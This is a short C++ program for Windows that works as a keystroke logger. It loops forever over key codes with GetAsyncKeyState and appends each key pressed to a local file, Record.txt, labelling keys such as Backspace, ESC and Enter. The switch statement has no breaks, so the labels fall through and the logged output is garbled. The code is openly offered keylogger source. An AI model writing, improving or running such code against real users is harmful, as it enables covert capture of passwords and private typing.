#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <fstream>

using namespace std;

void log(){
char c;
for(;;){
for(c=8;c<=222;c++){
        if(GetAsyncKeyState(c) == -32767){
        ofstream write ("Record.txt", ios::app);
        //write << c;
        switch(c){
		case 8: write << "<Backspace>"; //check ASCII code
		case 27: write << "<ESC>";
		case 127: write << "<DEL>";
		case 32: write << " ";
		case 13: write << "<Enter>\n";
		default: write << c;
	}
	}
}}
}

int main(){
	char C = 'a', c1 = 97; //ASCII code
	cout << C << " :: " << c1 << endl;

	log();

	return 0;
}
